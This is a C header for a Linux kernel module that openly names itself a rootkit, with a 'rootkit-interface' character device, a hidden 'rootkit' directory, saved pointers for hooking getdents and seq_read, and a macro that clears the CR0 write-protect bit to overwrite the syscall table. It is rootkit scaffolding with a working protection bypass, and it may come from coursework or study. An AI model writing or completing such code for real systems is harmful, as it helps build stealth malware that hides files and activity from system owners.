#pragma once

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>
#include <asm/current.h>
#include <linux/uaccess.h>
#include <asm/errno.h>
#include <linux/kallsyms.h>
#include <linux/kdev_t.h>
#include <linux/cdev.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>

#define DEVICE_NAME "rootkit-interface"
#define HIDDEN_DIR "rootkit"
#define TEST_MSG "Inserting Rootkit"
#define MSG_BUF_LEN 100

//Defs for auto insert into devfs
static struct cdev root_kit;
static int init_val;
static struct class *cl;
static dev_t first_dev_num;

//Device function declerations
static int rootkit_load(void);
static void rootkit_remove(void);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
struct file* file_open(const char *, int, int); //move to seperate header file later

//chrdev related
static int major_number; //num assigned to device driver
static char msg_buf[MSG_BUF_LEN];
static char *msg_ptr;
static char command_buffer[10];
static char *command_ptr;
static int Device_Open = 0;
static int USE_COUNT = 0;

//Globals for intercepts
static typeof(sys_getdents) *orig_getdents;
static typeof(seq_read) *orig_proc_read;

//Allow writes to sys_call_table
#define CRO_WRITE_UNLOCK(x) \
	do { \
		unsigned long __cr0; \
		preempt_disable(); \
		__cr0 = read_cr0() & (~X86_CR0_WP); \
	    BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
	    write_cr0(__cr0); \
	    x; \
	    __cr0 = read_cr0() | X86_CR0_WP; \
	    BUG_ON(unlikely(!(__cr0 & X86_CR0_WP))); \
	    write_cr0(__cr0); \
	    preempt_enable(); \
	} while (0)

